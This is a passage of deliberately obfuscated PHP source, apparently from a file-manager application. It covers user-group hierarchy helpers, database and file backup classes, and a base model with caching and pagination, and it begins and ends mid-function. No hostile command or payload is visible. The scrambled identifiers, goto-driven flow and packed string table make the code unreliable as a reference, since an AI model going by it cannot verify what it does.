(!$AÁÃ÷ˆöÖ²) { $AÀªíô‹Û[] = $FšæâÆ³ÊŞ[$AßØîê¯ËÈ]; } } return $AÀªíô‹Û; } protected function isParentOf($FíÌ§ÕÚ×Œ, $aÊÕÂæàÑŸ) { goto fºÊìµ—¦; fºÊìµ—¦: $dì·Œ‚é§À =& $_SERVER[òÀöí]; if (!$FíÌ§ÕÚ×Œ || !$aÊÕÂæàÑŸ || $FíÌ§ÕÚ×Œ == $aÊÕÂæàÑŸ) { return !1; } $AŞßöêÖ“° = $this->getInfoSimple($FíÌ§ÕÚ×Œ); goto F»†—à‰šÖ; F»†—à‰šÖ: $CÕñß¸ğÒ = $this->getInfoSimple($aÊÕÂæàÑŸ); $A‡áÔƒ¯‹’ = $AŞßöêÖ“°[$dì·Œ‚é§À[477]] . $FíÌ§ÕÚ×Œ . $dì·Œ‚é§À[47]; if (substr($CÕñß¸ğÒ[$dì·Œ‚é§À[477]], 0, strlen($A‡áÔƒ¯‹’)) == $A‡áÔƒ¯‹’) { return !0; } goto eÄˆé«„Û; eÄˆé«„Û: return !1; goto dºì¶¬ÑÕº; dºì¶¬ÑÕº: } public function groupShowRoot($fë˜ë‡ÒĞŞ, $b©ƒñíì° = false) { goto B¬ò¼ …™ó; E¦ÆÛôÑİÛ: return $C×ÉÂíÜª¬; goto F…Ç¡Œ¡ñ‰; B¬ò¼ …™ó: $F‚°Ë©¬â =& $_SERVER[òÀöí]; $c«‹ŠİŒÍÀ = $this->getInfo($fë˜ë‡ÒĞŞ); if (!$c«‹ŠİŒÍÀ) { return array(); } goto eå©ÓÙßª; F¤’·Àª´°: if ($b©ƒñíì° && count($EÆáÕ†Ë³©) == 1) { return $C×ÉÂíÜª¬; } if (!$c«‹ŠİŒÍÀ[$F‚°Ë©¬â[434]] || !isset($c«‹ŠİŒÍÀ[$F‚°Ë©¬â[434]][$F‚°Ë©¬â[1742]]) || $c«‹ŠİŒÍÀ[$F‚°Ë©¬â[434]][$F‚°Ë©¬â[1742]] == $F‚°Ë©¬â[1715]) { return $this->groupShowRoot($EÆáÕ†Ë³©[count($EÆáÕ†Ë³©) - 1], $b©ƒñíì°); } if ($c«‹ŠİŒÍÀ[$F‚°Ë©¬â[434]][$F‚°Ë©¬â[1742]] == $F‚°Ë©¬â[355]) { $cº‚ù¡´Ö = explode($F‚°Ë©¬â[47], $c«‹ŠİŒÍÀ[$F‚°Ë©¬â[434]][$F‚°Ë©¬â[1743]]); if ($cº‚ù¡´Ö) { $C×ÉÂíÜª¬ = array_merge($C×ÉÂíÜª¬, $cº‚ù¡´Ö); } } goto E¦ÆÛôÑİÛ; eå©ÓÙßª: $EÆáÕ†Ë³© = $this->parentLevelArray($c«‹ŠİŒÍÀ[$F‚°Ë©¬â[477]]); $C×ÉÂíÜª¬ = array($fë˜ë‡ÒĞŞ); if (count($EÆáÕ†Ë³©) == 0) { return $C×ÉÂíÜª¬; } goto F¤’·Àª´°; F…Ç¡Œ¡ñ‰: } protected function resetParentLevel() { $Aæ™ËÍğÈì =& $_SERVER[òÀöí]; $F­¹ÊØêÈÌ = $Aæ™ËÍğÈì[1663]; $E¶ÂáäãĞ¸ = $this->select(); $E¶ÂáäãĞ¸ = array_to_keyvalue($E¶ÂáäãĞ¸, $F­¹ÊØêÈÌ); foreach ($E¶ÂáäãĞ¸ as $b¹½îÂ±—) { goto bŠ¿ÖÁ­Å«; bŠ¿ÖÁ­Å«: $e½„Şª–±‘ = $b¹½îÂ±—; $FËİ©ÜŠÜÚ = array(); while ($e½„Şª–±‘[$Aæ™ËÍğÈì[479]] != 0) { $FËİ©ÜŠÜÚ[] = $e½„Şª–±‘[$Aæ™ËÍğÈì[479]]; $e½„Şª–±‘ = $E¶ÂáäãĞ¸[$e½„Şª–±‘[$Aæ™ËÍğÈì[479]]]; } goto CèÕœÏÀ‘×; CèÕœÏÀ‘×: $FËİ©ÜŠÜÚ[] = 0; $FËİ©ÜŠÜÚ = $Aæ™ËÍğÈì[47] . implode($Aæ™ËÍğÈì[47], array_reverse($FËİ©ÜŠÜÚ)) . $Aæ™ËÍğÈì[47]; $this->setNamePinyin($b¹½îÂ±—[$F­¹ÊØêÈÌ], $b¹½îÂ±—[$Aæ™ËÍğÈì[28]]); goto EœŞŒ„¥­©; EœŞŒ„¥­©: $this->where(array($F­¹ÊØêÈÌ => $b¹½îÂ±—[$F­¹ÊØêÈÌ]))->save(array($Aæ™ËÍğÈì[542] => $FËİ©ÜŠÜÚ)); goto e†ã«ò¯ñ¬; e†ã«ò¯ñ¬: } return $E¶ÂáäãĞ¸; } public function groupNameAuto($FÉ¯ƒÑğ¸, $d¾Ì…§Á¾ó) { $dÌä¢Îä¸ =& $_SERVER[òÀöí]; $Aƒ¿è®çí = $this->where(array($dÌä¢Îä¸[386] => $FÉ¯ƒÑğ¸))->getField($dÌä¢Îä¸[28], !0); if (!$Aƒ¿è®çí || !in_array($d¾Ì…§Á¾ó, $Aƒ¿è®çí)) { return $d¾Ì…§Á¾ó; } for ($AÁù“˜Éƒ = 1; $AÁù“˜Éƒ <= count($Aƒ¿è®çí) + 1; $AÁù“˜Éƒ++) { $f„· ²µÃÔ = $d¾Ì…§Á¾ó . "\x28{$AÁù“˜Éƒ}\51"; if (!in_array($f„· ²µÃÔ, $Aƒ¿è®çí)) { return $f„· ²µÃÔ; } } } } goto bœê‡¨ğÈÇ; e•øƒŠ®‰§: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $FÚ‹ƒ§„ƒ™ =& $_SERVER[òÀöí]; self::$name = date($FÚ‹ƒ§„ƒ™[706]); if (!($F”âø‡·éŠ = Model($FÚ‹ƒ§„ƒ™[707])->lastItem())) { $F”âø‡·éŠ = $this->initData(); } else { self::$name = $F”âø‡·éŠ[$FÚ‹ƒ§„ƒ™[28]]; if ($F”âø‡·éŠ[$FÚ‹ƒ§„ƒ™[708]] == $FÚ‹ƒ§„ƒ™[86]) { self::$name = date($FÚ‹ƒ§„ƒ™[709]); $eĞÜËˆóÕ = 0; if (isset($F”âø‡·éŠ[$FÚ‹ƒ§„ƒ™[289]][$FÚ‹ƒ§„ƒ™[173]][$FÚ‹ƒ§„ƒ™[436]])) { $eĞÜËˆóÕ = (int) $F”âø‡·éŠ[$FÚ‹ƒ§„ƒ™[289]][$FÚ‹ƒ§„ƒ™[173]][$FÚ‹ƒ§„ƒ™[436]]; } if ($F”âø‡·éŠ[$FÚ‹ƒ§„ƒ™[28]] == self::$name) { Model($FÚ‹ƒ§„ƒ™[707])->remove($F”âø‡·éŠ[$FÚ‹ƒ§„ƒ™[385]]); } $F”âø‡·éŠ = $this->initData($eĞÜËˆóÕ, $F”âø‡·éŠ[$FÚ‹ƒ§„ƒ™[710]]); } else { $this->checkStore($F”âø‡·éŠ[$FÚ‹ƒ§„ƒ™[710]]); } } self::$option = $F”âø‡·éŠ; } private function initData($Cî¬É®¿­• = 0, $a‡¡¬ôÊ°© = '') { goto B»ÁÈÂÎ«Ö; B»ÁÈÂÎ«Ö: $d­ÈÌˆ£¥ê =& $_SERVER[òÀöí]; $a§éÀ—”Ì† = Model($d­ÈÌˆ£¥ê[707])->config(); if ($a‡¡¬ôÊ°© && $a§éÀ—”Ì†[$d­ÈÌˆ£¥ê[710]] != $a‡¡¬ôÊ°©) { $Cî¬É®¿­• = 0; } goto Dé’×•ñÜ; Dé’×•ñÜ: $this->checkStore($a§éÀ—”Ì†[$d­ÈÌˆ£¥ê[710]]); $cØ÷»áô·† = array($d­ÈÌˆ£¥ê[710] => $a§éÀ—”Ì†[$d­ÈÌˆ£¥ê[710]], $d­ÈÌˆ£¥ê[28] => self::$name, $d­ÈÌˆ£¥ê[708] => 0, $d­ÈÌˆ£¥ê[711] => $a§éÀ—”Ì†[$d­ÈÌˆ£¥ê[711]], $d­ÈÌˆ£¥ê[289] => array($d­ÈÌˆ£¥ê[712] => array($d­ÈÌˆ£¥ê[708] => 0), $d­ÈÌˆ£¥ê[713] => array($d­ÈÌˆ£¥ê[708] => 0, $d­ÈÌˆ£¥ê[714] => 0, $d­ÈÌˆ£¥ê[715] => 0, $d­ÈÌˆ£¥ê[29] => $d­ÈÌˆ£¥ê[33]), $d­ÈÌˆ£¥ê[716] => array($d­ÈÌˆ£¥ê[708] => 0, $d­ÈÌˆ£¥ê[714] => 0, $d­ÈÌˆ£¥ê[715] => 0), $d­ÈÌˆ£¥ê[173] => array($d­ÈÌˆ£¥ê[708] => 0, $d­ÈÌˆ£¥ê[717] => 0, $d­ÈÌˆ£¥ê[718] => 0, $d­ÈÌˆ£¥ê[719] => 0, $d­ÈÌˆ£¥ê[720] => 0, $d­ÈÌˆ£¥ê[436] => $Cî¬É®¿­•)), $d­ÈÌˆ£¥ê[721] => time(), $d­ÈÌˆ£¥ê[465] => 0); $C”ÎÏ¯£ÏŠ = Model($d­ÈÌˆ£¥ê[707])->insert($cØ÷»áô·†); goto CØÑ‘©Ä¼; CØÑ‘©Ä¼: $cØ÷»áô·†[$d­ÈÌˆ£¥ê[385]] = $C”ÎÏ¯£ÏŠ; return $cØ÷»áô·†; goto Có¨„”…Ñ; Có¨„”…Ñ: } private function checkStore($BÃøŒãº¹) { $Dò¡Šğ„‡ƒ =& $_SERVER[òÀöí]; $AÂ°ƒÆì¿ = Model($Dò¡Šğ„‡ƒ[722])->listData($BÃøŒãº¹); Model($Dò¡Šğ„‡ƒ[722])->checkConfig($AÂ°ƒÆì¿); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[òÀöí][707])->findByName(self::$name); } return self::$option; } public static function set($aë‹­…‡ù•) { $BºåÊùĞ¿ã =& $_SERVER[òÀöí]; $fÄ¹¦Ô©§ƒ = self::get(); foreach ($aë‹­…‡ù• as $Aµœ«ÙªÊ => $eÕöàø¢É) { $c¦ôé™éÃª = explode($BºåÊùĞ¿ã[94], $Aµœ«ÙªÊ); $a´¢èÔ»Ü = count($c¦ôé™éÃª); switch ($a´¢èÔ»Ü) { case 1: $fÄ¹¦Ô©§ƒ[$c¦ôé™éÃª[0]] = $eÕöàø¢É; break; case 2: $fÄ¹¦Ô©§ƒ[$c¦ôé™éÃª[0]][$c¦ôé™éÃª[1]] = $eÕöàø¢É; break; case 3: $fÄ¹¦Ô©§ƒ[$c¦ôé™éÃª[0]][$c¦ôé™éÃª[1]][$c¦ôé™éÃª[2]] = $eÕöàø¢É; break; } } Model($BºåÊùĞ¿ã[707])->update($fÄ¹¦Ô©§ƒ[$BºåÊùĞ¿ã[385]], $fÄ¹¦Ô©§ƒ); self::$option = $fÄ¹¦Ô©§ƒ; return self::$option; } public function keep() { $e«‹ñÏ£ =& $_SERVER[òÀöí]; $DÂĞ­˜˜ªÇ = self::get(); if ($DÂĞ­˜˜ªÇ[$e«‹ñÏ£[289]][$e«‹ñÏ£[712]][$e«‹ñÏ£[708]] == $e«‹ñÏ£[86]) { return; } $this->backupKeep($DÂĞ­˜˜ªÇ); self::set(array($e«‹ñÏ£[723] => 1)); } private function backupKeep($dƒ‘”Šš¤×) { goto Bò‘Æ¤Öõ±; A®Ş‡é‘: $f†®¯ÁÏÕ = 0; $b—‘ñ‹Ó = array(); foreach ($bØÈÃÑ‹½¨ as $eàÇ–ùÈÂ¯) { if ($f†®¯ÁÏÕ >= 7) { break; } $b—‘ñ‹Ó[] = $eàÇ–ùÈÂ¯[$BĞÊ‹á¾®[28]]; $f†®¯ÁÏÕ++; } goto E“äÜğÒß; Bò‘Æ¤Öõ±: $BĞÊ‹á¾® =& $_SERVER[òÀöí]; $bØÈÃÑ‹½¨ = Model($BĞÊ‹á¾®[707])->listData(); if (empty($bØÈÃÑ‹½¨)) { return; } goto A®Ş‡é‘; E“äÜğÒß: for ($f†®¯ÁÏÕ = 0; $f†®¯ÁÏÕ < 12; $f†®¯ÁÏÕ++) { $b—‘ñ‹Ó[] = date($BĞÊ‹á¾®[724], strtotime("\x2d{$f†®¯ÁÏÕ}\40\x6d\x6f\156\164\x68\163")); } $b—‘ñ‹Ó = array_unique($b—‘ñ‹Ó); foreach ($bØÈÃÑ‹½¨ as $eàÇ–ùÈÂ¯) { if (!empty($eàÇ–ùÈÂ¯[$BĞÊ‹á¾®[28]]) && in_array($eàÇ–ùÈÂ¯[$BĞÊ‹á¾®[28]], $b—‘ñ‹Ó)) { continue; } Model($BĞÊ‹á¾®[707])->remove($eàÇ–ùÈÂ¯[$BĞÊ‹á¾®[385]]); $dÚ‡¯£Öõ = "\173\151\x6f\72{$dƒ‘”Šš¤×[$BĞÊ‹á¾®[710]]}\x7d\57\x64\141\164\141\142\x61\163\145\x2f\142\x61\143\153\x75\160\x5f{$eàÇ–ùÈÂ¯[$BĞÊ‹á¾®[28]]}"; IO::remove($dÚ‡¯£Öõ, !1); } goto cØßƒË¼…; cØßƒË¼…: } public function db() { goto cÁÆ¥ç; e¤ÖÛÃ« „: return !0; goto fëØ…ë‹˜í; cÁÆ¥ç: $aç„‘â­“ù =& $_SERVER[òÀöí]; $d´ˆš®ùö¸ = self::get(); if ($d´ˆš®ùö¸[$aç„‘â­“ù[289]][$aç„‘â­“ù[713]][$aç„‘â­“ù[708]] == $aç„‘â­“ù[86]) { return !0; } goto fŒ¸Îô÷Šİ; fŒ¸Îô÷Šİ: $fÛèìÅ¯¨– = new BackupDb(); if (!$fÛèìÅ¯¨–->index()) { return !1; } self::set(array($aç„‘â­“ù[725] => 1)); goto e¤ÖÛÃ« „; fëØ…ë‹˜í: } public function dbFile() { goto A…³Æ³à¤; DŒİâ¦Úƒ÷: $Cğğ£Íõ  = new BackupDbFile(); if (!$Cğğ£Íõ ->index()) { return !1; } self::set(array($A¦¼ä¡É‚°[726] => 1)); goto aİÄ „©À°; aİÄ „©À°: return !0; goto Dğ‡Æ–æß; A…³Æ³à¤: $A¦¼ä¡É‚° =& $_SERVER[òÀöí]; $E×Ì£»ŠÍÙ = self::get(); if ($E×Ì£»ŠÍÙ[$A¦¼ä¡É‚°[289]][$A¦¼ä¡É‚°[716]][$A¦¼ä¡É‚°[708]] == $A¦¼ä¡É‚°[86]) { return !0; } goto DŒİâ¦Úƒ÷; Dğ‡Æ–æß: } public function file() { $F—×Ó¼§½­ =& $_SERVER[òÀöí]; $cøÀ£ßˆ‘æ = self::get(); if ($cøÀ£ßˆ‘æ[$F—×Ó¼§½­[289]][$F—×Ó¼§½­[173]][$F—×Ó¼§½­[708]] == $F—×Ó¼§½­[86]) { return !0; } if (!isset($cøÀ£ßˆ‘æ[$F—×Ó¼§½­[711]]) || $cøÀ£ßˆ‘æ[$F—×Ó¼§½­[711]] == $F—×Ó¼§½­[486]) { $a³…»Şùœ¬ = new BackupFile(); if (!$a³…»Şùœ¬->index()) { return !1; } } self::set(array($F—×Ó¼§½­[727] => 1, $F—×Ó¼§½­[708] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto bÜ´·„ÛË; aÎá„À„œÊ: mk_dir($e÷©ÎŒìãÖ); $bÉ»ˆÔÊé = $a’ßŒì = 0; try { $eŒ¢¼¾Â£å = $AÄ™—©Û‰->db()->getTables(); } catch (Exception $f‹‘¹‹š¹) { return !1; } goto E›˜‰ÑéŒ; c´ÌÕø©É: foreach ($eŒ¢¼¾Â£å as $D©ª‰æŸŠ—) { $a‰êÄŠÀ… = $e÷©ÎŒìãÖ . $D©ª‰æŸŠ— . $eõ³‹Œ’Âë[736]; $f¡ÚºöÌğ = null; if ($D©ª‰æŸŠ— == $eõ³‹Œ’Âë[737] && (!isset($dÆŠ……ó™¤[$eõ³‹Œ’Âë[711]]) || $dÆŠ……ó™¤[$eõ³‹Œ’Âë[711]] == $eõ³‹Œ’Âë[486])) { $f¡ÚºöÌğ = self::$io; } $a’ßŒì += $AÄ™—©Û‰->sqlFromDb($D©ª‰æŸŠ—, $a‰êÄŠÀ…, $cîÛ„Û©”Û, $f¡ÚºöÌğ); } $cîÛ„Û©”Û->end(); $dÄøó®±ù = array($eõ³‹Œ’Âë[738] => $c§¶©è¡¯÷, $eõ³‹Œ’Âë[725] => 1, $eõ³‹Œ’Âë[739] => $bÉ»ˆÔÊé + 1, $eõ³‹Œ’Âë[740] => $a’ßŒì); goto cášˆÑê´Ø; bÜ´·„ÛË: $eõ³‹Œ’Âë =& $_SERVER[òÀöí]; $dÆŠ……ó™¤ = Backup::get(); self::$io = $dÆŠ……ó™¤[$eõ³‹Œ’Âë[710]]; goto cœ¤ô©áÜ§; cœ¤ô©áÜ§: self::$name = $dÆŠ……ó™¤[$eõ³‹Œ’Âë[28]]; $E´ô¤Î = $GLOBALS[$eõ³‹Œ’Âë[6]][$eõ³‹Œ’Âë[17]]; $c§¶©è¡¯÷ = $this->_dbType($E´ô¤Î); goto CäÉõêô¼®; CäÉõêô¼®: $AÄ™—©Û‰ = new DbManage($E´ô¤Î, $c§¶©è¡¯÷); $e÷©ÎŒìãÖ = TEMP_FILES . $eõ³‹Œ’Âë[728] . self::$name . $eõ³‹Œ’Âë[8]; del_dir($e÷©ÎŒìãÖ); goto aÎá„À„œÊ; cášˆÑê´Ø: Backup::set($dÄøó®±ù); if ($bÉ»ˆÔÊé > $a’ßŒì) { return !1; } return !0; goto cä™Œº°’‘; E›˜‰ÑéŒ: $eŒ¢¼¾Â£å = array_diff($eŒ¢¼¾Â£å, array($eõ³‹Œ’Âë[729], $eõ³‹Œ’Âë[730])); foreach ($eŒ¢¼¾Â£å as $D©ª‰æŸŠ—) { $bÉ»ˆÔÊé += $AÄ™—©Û‰->model($D©ª‰æŸŠ—)->count(); } $cîÛ„Û©”Û = new Task($eõ³‹Œ’Âë[731], $eõ³‹Œ’Âë[732], $bÉ»ˆÔÊé, LNG($eõ³‹Œ’Âë[733]) . $eõ³‹Œ’Âë[734] . LNG($eõ³‹Œ’Âë[735])); goto c´ÌÕø©É; cä™Œº°’‘: } private function _dbType($bª®±ßèÂ) { goto aÜ»ò¸ÊƒÑ; FÖ¯×‘¿‹: return $Aƒ¸¢«Ê‹ƒ; goto Cã¿ÃÒ ™è; CˆÁ˜¶ÑØÕ: if ($Aƒ¸¢«Ê‹ƒ == $aŞ¾–õ¢Ú[742]) { $Fˆ›‚Åˆ³ = explode($aŞ¾–õ¢Ú[4], $bª®±ßèÂ[$aŞ¾–õ¢Ú[743]]); $Aƒ¸¢«Ê‹ƒ = $Fˆ›‚Åˆ³[0]; } $aø“…Òƒ = array($aŞ¾–õ¢Ú[744] => $aŞ¾–õ¢Ú[9], $aŞ¾–õ¢Ú[745] => $aŞ¾–õ¢Ú[746]); if (isset($aø“…Òƒ[$Aƒ¸¢«Ê‹ƒ])) { $Aƒ¸¢«Ê‹ƒ = $aø“…Òƒ[$Aƒ¸¢«Ê‹ƒ]; } goto FÖ¯×‘¿‹; aÜ»ò¸ÊƒÑ: $aŞ¾–õ¢Ú =& $_SERVER[òÀöí]; $bª®±ßèÂ = array_change_key_case($bª®±ßèÂ); $Aƒ¸¢«Ê‹ƒ = $bª®±ßèÂ[$aŞ¾–õ¢Ú[741]]; goto CˆÁ˜¶ÑØÕ; Cã¿ÃÒ ™è: } } class BackupDbFile { public function __construct() { } public function index() { goto B¢¡Ù™Š‰; fï„¡Û„Ï­: if (!$E£¢¬ÈÔ…º) { return !1; } Backup::set(array($aíÈ»‹Ó®Å[747] => $E£¢¬ÈÔ…º)); $C‹ñˆòÇÔç = new TaskFileTransfer($aíÈ»‹Ó®Å[748], $aíÈ»‹Ó®Å[732], count($BÒ»ĞßÔ…), LNG($aíÈ»‹Ó®Å[733]) . $aíÈ»‹Ó®Å[429] . LNG($aíÈ»‹Ó®Å[735]) . $aíÈ»‹Ó®Å[749]); goto A´ˆ¶Øàí; c—ØËË¶µ“: $f„ÑĞ…Ÿ‰Ü = TEMP_FILES . "\142\x61\x63\153\x75\160\137{$f©à´ª÷Ş}\57"; $C¢˜ÛÁ¸ = "\173\151\x6f\72{$CÚŞ©Ú¤ã”[$aíÈ»‹Ó®Å[710]]}\x7d\x2f\x64\141\x74\x61\x62\x61\163\x65\57\142\141\x63\153\x75\x70\137{$f©à´ª÷Ş}\57"; if (!($C¢˜ÛÁ¸ = IO::mkdir($C¢˜ÛÁ¸))) { return !1; } goto AİÙ—‹¦â; B’ŞËÁ î: $C‹ñˆòÇÔç->end(); Backup::set(array($aíÈ»‹Ó®Å[752] => $E£¢¬ÈÔ…º)); return !0; goto f„ŸŒëå™¸; AİÙ—‹¦â: $CÃĞÊÃ‚ = IO::listPath($f„ÑĞ…Ÿ‰Ü); $BÒ»ĞßÔ… = isset($CÃĞÊÃ‚[$aíÈ»‹Ó®Å[73]]) ? $CÃĞÊÃ‚[$aíÈ»‹Ó®Å[73]] : array(); $E£¢¬ÈÔ…º = array_sum(array_column($BÒ»ĞßÔ…, $aíÈ»‹Ó®Å[77])); goto fï„¡Û„Ï­; A´ˆ¶Øàí: $C‹ñˆòÇÔç->task[$aíÈ»‹Ó®Å[717]] = $E£¢¬ÈÔ…º; foreach ($CÃĞÊÃ‚[$aíÈ»‹Ó®Å[73]] as $cä£ê×‚ÛŠ) { $F‚ì¯ƒÑ•¤ = IO::move($cä£ê×‚ÛŠ[$aíÈ»‹Ó®Å[75]], $C¢˜ÛÁ¸); if (!$F‚ì¯ƒÑ•¤) { $C‹ñˆòÇÔç->end(); return !1; } } $BôÑØ±‹¨‘ = CONTROLLER_DIR . $aíÈ»‹Ó®Å[750]; goto d‰£ƒœÎ§; B¢¡Ù™Š‰: $aíÈ»‹Ó®Å =& $_SERVER[òÀöí]; $CÚŞ©Ú¤ã” = Backup::get(); $f©à´ª÷Ş = $CÚŞ©Ú¤ã”[$aíÈ»‹Ó®Å[28]]; goto c—ØËË¶µ“; d‰£ƒœÎ§: $aÃÏ›‡åë = CONTROLLER_DIR . $aíÈ»‹Ó®Å[751]; IO::copy($BôÑØ±‹¨‘, $C¢˜ÛÁ¸); IO::copy($aÃÏ›‡åë, $C¢˜ÛÁ¸); goto B’ŞËÁ î; f„ŸŒëå™¸: } } goto eáÒê“Ã¸; C†å¦ËÓª: define($_SERVER[òÀöí][0], $_SERVER[òÀöí][1]); $_SERVER[ÉØ›ù‘ºø] = explode($_SERVER[òÀöí][2], gzinflate(substr($_SERVER[òÀöí][3], 10, -8))); function binCheckEq($BƒæÃñÀÏ¹, $CöÆ­Àâ²) { return $BƒæÃñÀÏ¹ == $CöÆ­Àâ²; } goto Eç¼¹ÌÆÙâ; bó¦¤‹î‰à: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\146\171\x54\151\155\145", "\164\151\x6d\145", "\x69\x6e\163\145\162\164\x2c\165\x70\x64\x61\x74\145", "\x66\165\x6e\x63\164\151\x6f\156"), array("\143\162\x65\x61\164\145\x54\151\x6d\145", "\x74\x69\155\x65", "\151\156\163\x65\162\x74", "\x66\165\156\143\164\151\x6f\156")); public function setDataAuto($cøœš«ñÀ™) { $this->dataAuto = $cøœš«ñÀ™; } public function __construct($bŸº¾ÕåŠ¹ = '', $fñ£²Ò àÑ = '', $Bò‹ˆéëÑŒ = '') { parent::__construct($bŸº¾ÕåŠ¹, $fñ£²Ò àÑ, $Bò‹ˆéëÑŒ); } public static function textEncode($cÒÑâç™°) { if (!$cÒÑâç™°) { return $cÒÑâç™°; } $b²Î„ÜòÓ¾ = json_encode($cÒÑâç™°); $b²Î„ÜòÓ¾ = preg_replace_callback($_SERVER[òÀöí][351], function ($Cœôå˜·…) { return addslashes($Cœôå˜·…[0]); }, $b²Î„ÜòÓ¾); return json_decode($b²Î„ÜòÓ¾); } public static function textDecode($AƒÂ×ºø½) { $E§õ¸‘œ‚ =& $_SERVER[òÀöí]; $d®éÅºĞî¶ = json_encode($AƒÂ×ºø½); $d®éÅºĞî¶ = preg_replace_callback($E§õ¸‘œ‚[352], function ($d°¬ÁÚÚ¶ì) { return $_SERVER[òÀöí][96]; }, $d®éÅºĞî¶); return json_decode($d®éÅºĞî¶); } protected $tableMeta = array(); protected function _beforeInsert(&$BÓ°‚²ˆ¡µ, $aèª¤æÏîè) { $Bƒìè³ÖİÜ =& $_SERVER[òÀöí]; if (!$this->checkDataAutoHas($Bƒìè³ÖİÜ[353])) { return; } $this->dataBeforeFilter($BÓ°‚²ˆ¡µ, $Bƒìè³ÖİÜ[353]); } protected function _beforeUpdate(&$DÁ•¨Ãƒã, $C–î·İÍåİ) { $f„Óõ¿š¿ô =& $_SERVER[òÀöí]; if (!$this->checkDataAutoHas($f„Óõ¿š¿ô[354])) { return; } $this->dataBeforeFilter($DÁ•¨Ãƒã, $f„Óõ¿š¿ô[354]); } protected function _afterSelect(&$bº½ç¦ÙÃ, $CĞ¢‰£ºùÆ) { if (!is_array($bº½ç¦ÙÃ)) { return; } if (!$this->checkDataAutoHas($_SERVER[òÀöí][355])) { return; } foreach ($bº½ç¦ÙÃ as &$a­’…”•ª) { $this->dataAfterFilter($a­’…”•ª); } unset($a­’…”•ª); } protected function _afterFind(&$D†Œ»÷–Á°, $fáËè™öîî) { if (!is_array($D†Œ»÷–Á°)) { return; } if (!$this->checkDataAutoHas($_SERVER[òÀöí][355])) { return; } $this->dataAfterFilter($D†Œ»÷–Á°); } public function setAutoIncrement($AøˆÉ£ñİŒ) { $FÖ‚­Ò°ˆ = array($this->getPk() => $AøˆÉ£ñİŒ); $d¾ßêŸ–èÌ = $this->data($FÖ‚­Ò°ˆ)->add(); if ($d¾ßêŸ–èÌ) { $this->delete($d¾ßêŸ–èÌ); } } public function getAutoIncrement() { $Aİ§™«²‡ = $this->getTableName(); $dáÖ‰ßëÙç = $this->max($this->getPk()); $dà ÛĞ¡÷Ø = $this->query("\163\150\157\167\x20\x74\141\142\154\x65\40\163\x74\x61\164\x75\x73\40\167\150\145\162\x65\x20\x4e\x61\155\145\75\x27{$Aİ§™«²‡}\47"); $b×â´™ì = $dà ÛĞ¡÷Ø[0][$_SERVER[òÀöí][356]]; $e£Éƒä À— = max($dáÖ‰ßëÙç, $b×â´™ì); return $e£Éƒä À—; } protected function _callBefore($FÃéÜµø, $FÇ³ŒñÛŞ›) { return $this->cacheCallCheck($FÃéÜµø, $FÇ³ŒñÛŞ›, !1); } protected function _callAfter($a„µÁ¢Ò¬ª, $B·¼ö‹Ï¨Ã) { return $this->cacheCallCheck($a„µÁ¢Ò¬ª, $B·¼ö‹Ï¨Ã, !0); } protected function cacheFunctionAlias($E›ò¾ß®»›) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($aÕÒƒåœÁ, $bÚôÅÄ¤§‘, $Cœ–Œ¥­ËÑ = false) { $DÂàºÊ°® = $this->cacheFunctionAlias($bÚôÅÄ¤§‘); if (!$DÂàºÊ°®) { return; } foreach ($DÂàºÊ°® as $b¡ô‚ñ·»ò => $FïÌö³íİ) { $F•ùŒïº•Ğ = $FïÌö³íİ[0]; $EŒ±£˜Íç = explode($_SERVER[òÀöí][47], $FïÌö³íİ[1]); if ($aÕÒƒåœÁ == $b¡ô‚ñ·»ò) { return $this->cacheFunctionGet($b¡ô‚ñ·»ò, $F•ùŒïº•Ğ); } if ($Cœ–Œ¥­ËÑ && in_array($aÕÒƒåœÁ, $EŒ±£˜Íç)) { $this->cacheFunctionClear($b¡ô‚ñ·»ò, $F•ùŒïº•Ğ); } } } public function cacheFunctionGet($bÀ³±”²œ, $dìƒ™æ˜¾) { $Cƒİ¡¶Ì³¨ = $this->cacheKeyMake($bÀ³±”²œ, $dìƒ™æ˜¾); $FàĞ²†Ö² = Cache::get($Cƒİ¡¶Ì³¨); if (!is_array($FàĞ²†Ö²)) { $FàĞ²†Ö² = call_user_func_array(array($this, $bÀ³±”²œ), array($dìƒ™æ˜¾, !0)); Cache::set($Cƒİ¡¶Ì³¨, $FàĞ²†Ö²); } return $FàĞ²†Ö²; } public function cacheFunctionClear($EÜ«Â¨ƒ™Í, $Bğ½–ÕÀ¾†) { $e²£´ØÚùµ = $Bğ½–ÕÀ¾†; if (!is_array($Bğ½–ÕÀ¾†)) { $e²£´ØÚùµ = array($Bğ½–ÕÀ¾†); } foreach ($e²£´ØÚùµ as $C°‹Ö–½Î¿) { $CÁó‹ì Á¾ = $this->cacheKeyMake($EÜ«Â¨ƒ™Í, $C°‹Ö–½Î¿); Cache::remove($CÁó‹ì Á¾); } } private function cacheKeyMake($cË”™À“¨ê, $cõùÏòùÇ) { $B¨©†ÉóÂ =& $_SERVER[òÀöí]; return get_class($this) . $B¨©†ÉóÂ[70] . $cË”™À“¨ê . $B¨©†ÉóÂ[357] . $cõùÏòùÇ; } protected function selectPage($d¿ÃÆ§œ½„ = 200, $BÕ£Òß›Èµ = 1) { goto A“×ë«¦; CŞÉ®•ˆ™: $cé¿†áË«² = ceil($cœŸì©¨ª / $d¿ÃÆ§œ½„); $BÕ£Òß›Èµ = intval(isset($in[$F„¡Õ…•˜[349]]) ? $in[$F„¡Õ…•˜[349]] : $BÕ£Òß›Èµ); $BÕ£Òß›Èµ = $BÕ£Òß›Èµ <= 1 ? 1 : ($BÕ£Òß›Èµ >= $cé¿†áË«² ? $cé¿†áË«² : $BÕ£Òß›Èµ); goto F§Œñöé¸; BåìÖÉ÷: if ($cé¿†áË«² == 1) { $cœŸì©¨ª = count($BÙ»ğøƒ Ö); } $eÔÍ¢µ¢ƒŸ = array($F„¡Õ…•˜[360] => array($F„¡Õ…•˜[361] => $cœŸì©¨ª, $F„¡Õ…•˜[358] => $d¿ÃÆ§œ½„, $F„¡Õ…•˜[349] => $BÕ£Òß›Èµ, $F„¡Õ…•˜[362] => $cé¿†áË«²), $F„¡Õ…•˜[363] => $BÙ»ğøƒ Ö ? $BÙ»ğøƒ Ö : array()); return $eÔÍ¢µ¢ƒŸ; goto 